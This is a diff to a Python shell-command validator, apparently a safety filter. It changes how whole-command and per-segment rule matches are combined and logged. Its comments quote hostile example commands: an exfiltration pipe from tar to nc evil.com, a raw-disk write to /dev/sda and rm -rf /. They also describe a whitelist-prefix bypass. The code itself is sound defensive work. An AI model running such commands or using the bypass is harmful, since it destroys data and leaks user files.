@@ -3187,7 +3187,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                 # so they belong to no segment and no per-segment reconstruction
                 # can carry them - `while true; do echo a; done > "/dev/sda"` was
                 # SAFE while the unquoted form was BLOCKED. Only a whole-command pass
-                # sees them. The unconditional scan below matches the unreconstructed
+                # sees them. The whole-command scan below matches the unreconstructed
                 # text only, where two quote characters hide the target, so this
                 # pass matches the reconstructions and feeds its result into it.
                 # Whitelist OFF: it is prefix-based, so a leading `ls` would vouch
@@ -3210,26 +3210,38 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         if whole.matched and whole.rule:
                             all_matched_rules.append(whole.rule.name)
 
-                # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
-                # fire, and take the higher of it and the segments. Unconditional: a rule a
-                # segment matched says nothing about a rule only the whole command can match.
-                # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
-                # already settled above by is_whitelisted_whole(). match_command()'s
-                # own whitelist check is prefix-based, and honouring it here would let
-                # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
-                match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
-                if not highest_match:
-                    all_matched_rules = []
-                if highest_match and highest_risk >= match.risk_level:
-                    match = RuleMatch(
-                        matched=True,
-                        rule=highest_match.rule,
-                        risk_level=highest_risk,
-                        message=highest_match.message,
-                        alternatives=highest_match.alternatives,
-                    )
-                elif all_matched_rules and match.rule:
-                    all_matched_rules.append(match.rule.name)
+                if highest_match and highest_risk == RiskLevel.BLOCKED:
+                    # Nothing ranks above BLOCKED, so the whole-command scan below cannot
+                    # change this verdict. It is also the costliest pass on a long command.
+                    match = highest_match
+                else:
+                    # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
+                    # fire, and take the higher of it and the segments: a rule a segment
+                    # matched says nothing about a rule only the whole command can match.
+                    # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
+                    # already settled above by is_whitelisted_whole(). match_command()'s
+                    # own whitelist check is prefix-based, and honouring it here would let
+                    # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
+                    # heredoc_ranges is deliberately NOT passed yet: the segments already
+                    # read a text heredoc body as text, and this scan is a fail-closed
+                    # backstop for a `$(…)` inside an unquoted heredoc body, which bash
+                    # expands (the substitution check above already catches most of those).
+                    # The price is that it also reads a text body as code; the ranges stay
+                    # withheld until that over-block is fixed.
+                    whole = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
+                    match = highest_match or whole
+                    if whole.risk_level > match.risk_level:
+                        match = whole
+                    # At or above the segments' level, the prompt and the audit log also get
+                    # the rule the whole-command scan reported (its first at that level, in
+                    # rule order). On a tie the segment's message stays.
+                    if (
+                        highest_match
+                        and whole.rule
+                        and whole.risk_level >= match.risk_level
+                        and whole.rule.name not in all_matched_rules
+                    ):
+                        all_matched_rules.append(whole.rule.name)
             else:
                 # Single segment - validate both original and reconstructed command
                 # SECURITY: Bashlex unescapes characters (e.g., 'rm\ -rf\ /' → 'rm -rf /')
